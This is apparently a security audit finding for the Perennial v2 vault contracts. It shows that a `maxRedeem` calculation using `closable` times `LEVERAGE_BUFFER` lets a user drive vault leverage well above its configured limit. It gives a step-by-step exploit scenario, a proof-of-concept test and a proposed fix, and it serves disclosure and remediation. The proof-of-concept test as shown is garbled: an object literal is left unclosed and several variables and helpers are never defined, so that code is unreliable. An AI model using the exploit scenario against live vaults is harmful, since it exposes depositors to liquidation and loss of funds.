# Vault leverage can be increased to any value up to min margin requirement due to incorrect `maxRedeem` calculations with closable and `LEVERAGE_BUFFER`

## Summary

When redeeming from the vault, maximum amount allowed to be redeemed is limited by collateral required to keep the minimum vault position size which will remain open due to different factors, including `closable` value, which is a limitation on how much position can be closed given current pending positions. However, when calclulating max redeemable amount, `closable` value is multiplied by `LEVERAGE_BUFFER` value (currently 1.2):
```solidity
UFixed6 collateral = marketContext.currentPosition.maker
    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker
    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable
    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral
    .muldiv(totalWeight, registration.weight);                                          // collateral in market
```

The intention seems to be to allow to withdraw a bit more collateral so that leverage can increase at max by LEVERAGE_BUFFER. However, the math is totally wrong here, for example:
- Current position = 12, `closable = 10`
- Max amount allowed to be redeemed is 12 (100% of shares)
- However, when all shares are withdrawn, `closable = 10` prevents full position closure, so position will remain at 12-10 = 2
- Once settled, user can claim all vault collateral while vault still has position of size 2 open. Claiming all collateral will revert due to this line in `allocate`:
```solidity
_locals.marketCollateral = strategy.marketContexts[marketId].margin
    .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));
```

So the user can claim the assets only if remaining collateral is equal to or is greater than total margin of all markets. This means that user can put the vault into max leverage possible ignoring the vault leverage config (vault will have open position of such size, which will make all vault collateral equal the minimum margin requirement to open such position). This creates a big risk for vault liquidation and loss of funds for vault depositors.

## Vulnerability Detail

As seen from the example above, it's possible to put the vault at high leverage only if user redeems amount higher than `closable` allows (redeem amount in the `closable`..`closable * LEVERAGE_BUFFER` range). However, since deposits and redeems from the vault are settled later, it's impossible to directly create such situation (redeemable amount > closable). There is still a way to create such situation indirectly via maker limit limitation.

Scenario:
1. Market config leverage = 4. Existing deposits = $1K. Existing positions in underlying market are worth $4K
2. Open maker position in underlying markets such that `makerLimit - currentMaker = $36K`
3. Deposit $11K to the vault (total deposits = $12K). The vault will try to open position of size = $48K (+$44K), however `makerLimit` will not allow to open full position, so the vault will only open +$36K (total position $40K)
4. Wait until the deposit settles
5. Close maker position in underlying markets to free up maker limit
6. Deposit minimum amount to the vault from another user. This increases vault positions to $48K (settled = $40K, pending = $48K, closable = $40K)
7. Redeem $11K from the vault. This is possible, because maxRedeem is `closable/leverage*LEVERAGE_BUFFER` = `$40K/4*1.2` = `$12K`. However, the position will be limited by `closable`, so it will be reduced only by $40K (set to $8K).
8. Wait until redeem settles
9. Claim $11K from the vault. This leaves the vault with the latest position = $8K, but only with $1K of original deposit, meaning vault leverage is now 8 - twice the value specified by config (4).

This scenario will keep high vault leverage only for a short time until next oracle version, because `claim` will reduce position back to $4K, however this position reduction can also be avoided, for example, by opening/closing positions to make `long-short = maker` or `short-long = maker` in the underlying market(s), thus disallowing the vault to reduce its maker position and keeping the high leverage.

## Impact

Malicious user can put the vault at very high leverage, breaking important protocol invariant (leverage not exceeding target market leverage) and exposing the users to much higher potential funds loss / risk from the price movement due to high leverage and very high risk of vault liquidation, causing additional loss of funds from liquidation penalties and position re-opening fees.

## Proof of concept

The scenario above is demonstrated in the test, add this to `Vault.test.ts`:
```ts
it('increase vault leverage', async () => {
    console.log("start");

    async function setOracle(latestTime: BigNumber, currentTime: BigNumber) {
    await setOracleEth(latestTime, currentTime)
    await setOracleBtc(latestTime, currentTime)
    }

    async function setOracleEth(latestTime: BigNumber, currentTime: BigNumber) {
    const [, currentPrice] = await oracle.latest()
    const newVersion = {
        timestamp: latestTime,
        price: currentPrice,
        valid: true,
    }
    oracle.status.returns([newVersion, currentTime])
    oracle.request.whenCalledWith(user.address).returns()
    oracle.latest.returns(newVersion)
    oracle.current.returns(currentTime)
    oracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)
    }

    async function setOracleBtc(latestTime: BigNumber, currentTime: BigNumber) {
    const [, currentPrice] = await btcOracle.latest()
    const newVersion = {

    btcOracle.request.whenCalledWith(user.address).returns()
    btcOracle.latest.returns(newVersion)

    }

    await setOracle(STARTING_TIMESTAMP.add(3600), STARTING_TIMESTAMP.add(3700))

    await btcMarket.connect(btcUser1).update(btcUser1.address, makerBeforeBtc, 0, 0, 0, false);

    await setOracle(STARTING_TIMESTAMP.add(3800), STARTING_TIMESTAMP.add(3900))

    await vault.connect(user).update(user.address, 0, redeem, 0);

    // settle all changes
    await setOracle(STARTING_TIMESTAMP.add(3900), STARTING_TIMESTAMP.add(4000))

    console.log("Claiming 11100")
    await vault.connect(user).update(user.address, 0, 0, claim);

    await logLeverage();
})
```

## Code Snippet

`maxRedeem` limits redeem amount by `closable * LEVERAGE_BUFFER`:
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L94-L98

`_positionLimit` calculates minimum possible position by reducing current position by max of `closable`:
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L219-L224

The difference in these values allows to keep high position while withdrawing more collateral than needed to target leverage.

## Tool used

Manual Review

## Recommendation

The formula to allow LEVERAGE_BUFFER should apply it to **final** position size, not to **delta** position size (`maxRedeem` returns delta to subtract from current position). Currently redeem amount it limited by: `closable * LEVERAGE_BUFFER`. Once subtracted from the current position size, we obtain:

- `maxRedeem = closable * LEVERAGE_BUFFER / leverage`
- `newPosition = currentPosition - closable`
- `newCollateral = (currentPosition - closable * LEVERAGE_BUFFER) / leverage`
- `newLeverage = newPosition / newCollateral = leverage * (currentPosition - closable) / (currentPosition - closable * LEVERAGE_BUFFER)`
- `= leverage / (1 - (LEVERAGE_BUFFER - 1) * closable / (currentPosition - closable))`

As can be seen, the new leverage can be any amount and the formula doesn't make much sense, it certainly doesn't limit new leverage factor to LEVERAGE_BUFFER (denominator can be 0, negative or any small value, meaning leverage can be any number as high as you want). I think what developers wanted, is to have:
- `newPosition = currentPosition - closable`
- `newCollateral = newPosition / (leverage * LEVERAGE_BUFFER)`
- `newLeverage = newPosition / (newPosition / (leverage * LEVERAGE_BUFFER)) = leverage * LEVERAGE_BUFFER`

Now, the important part to understand is that it's impossible to calculate delta collateral simply from delta position like it is now. When we know target newPosition, we can calculate target newCollateral, and then maxRedeem (delta collateral) can be calculated as `currentCollateral - newCollateral`:
- `maxRedeem = currentCollateral - newCollateral`
- `maxRedeem = currentCollateral - newPosition / (leverage * LEVERAGE_BUFFER)`

So the fixed collateral calculation can be something like that:

```solidity
UFixed6 deltaPosition = marketContext.currentPosition.maker
    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker
    .min(marketContext.closable);
UFixed6 targetPosition = marketContext.currentAccountPosition.maker.sub(deltaPosition); // expected ideal position
UFixed6 targetCollateral = targetPosition.muldiv(marketContext.latestPrice.abs(), 
    registration.leverage.mul(StrategyLib.LEVERAGE_BUFFER));                            // allow leverage to be higher by LEVERAGE_BUFFER
UFixed6 collateral = marketContext.local.collateral.sub(targetCollateral)               // delta collateral
    .muldiv(totalWeight, registration.weight);                                          // market collateral => vault collateral
```
